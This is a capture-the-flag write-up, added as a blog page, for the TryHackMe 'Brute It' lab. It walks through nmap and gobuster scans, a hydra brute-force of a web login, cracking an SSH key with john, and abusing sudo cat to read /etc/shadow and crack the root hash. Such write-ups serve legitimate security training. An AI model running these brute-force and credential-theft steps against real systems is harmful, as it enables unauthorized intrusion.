@@ -1,0 +1,98 @@
+---
+layout: default
+title : Brute It - Writeup
+---
+
+# [Main](https://bvr0n.github.io/) &nbsp;&nbsp;   [Contact](https://bvr0n.github.io/contact.html) &nbsp;&nbsp; [About Me](./aboutme.md) <br>
+
+_**Nov 08, 2020**_
+
+[Brute It](https://tryhackme.com/room/bruteit) Writeup
+
+
+## Nmap Scan :
+
+```
+bvr0n@kali:~/CTF/THM/Brute_It$ nmap -sC -sV 10.10.140.71 -Pn
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH *.*** Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
+|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
+|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
+80/tcp open  http    Apache httpd *.*.** ((Ubuntu))
+|_http-server-header: Apache/*.*.** (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## Web Enum :
+
+```
+bvr0n@kali:~$ gobuster dir -u http://10.10.140.71/ -w Documents/Dirbuster/wordlist.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.140.71/
+[+] Threads:        10
+[+] Wordlist:       Documents/Dirbuster/wordlist.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/11/08 06:58:30 Starting gobuster
+===============================================================
+/***** (Status: 301)
+```
+
+When accessing the web page, we got something in the code source :
+```
+<!-- Hey john, if you do not remember, the username is ***** -->
+```
+So now we know that the username is `*****`, let's start brute forcing with `hydra` :).
+
+```
+bvr0n@kali:~/CTF/THM/Brute_It$ hydra -l ***** -P ~/Documents/rockyou.txt 10.10.140.71 http-post-form "/*****/:user=^USER^&pass=^PASS^&LOGIN=Login:Username or password invalid"
+[DATA] attacking http-post-form://10.10.140.71:80/*****/:user=^USER^&pass=^PASS^&LOGIN=Login:Username or password invalid
+[80][http-post-form] host: 10.10.140.71   login: *****   password: ******
+```
+Let's grab the private key and brute force it with `john`, but first let's turn it into something john understand :
+```
+bvr0n@kali:~/CTF/THM/Brute_It$ /usr/share/john/ssh2john.py id_rsa > hash
+bvr0n@kali:~/CTF/THM/Brute_It$ sudo john hash --wordlist=/home/bvr0n/Documents/rockyou.txt
+**********       (id_rsa)
+```
+Now we have access into SSH.
+
+## Internal Enum :
+
+Looks like we have some privileges xD, we can read everything with `cat`, Let's grab the root hash inside `/etc/shadow` and crack it:
+```
+john@bruteit:~$ sudo -l
+Matching Defaults entries for john on bruteit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+```
+```
+john@bruteit:/home/thm$ sudo cat /etc/shadow
+root:$6$zdk0.************************************************LF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+bvr0n@kali:~/CTF/THM/Brute_It$ sudo john root.txt --wordlist=/home/bvr0n/Documents/rockyou.txt
+********         (root)
+```
+```
+john@bruteit:~$ sudo /bin/cat /root/root.txt
+THM{********************}
+```
+
+<br>
+best regards
+
+[bvr0n](https://github.com/bvr0n)
+
+
+<br>
+[back to main()](../../index.md)
+
+<br>
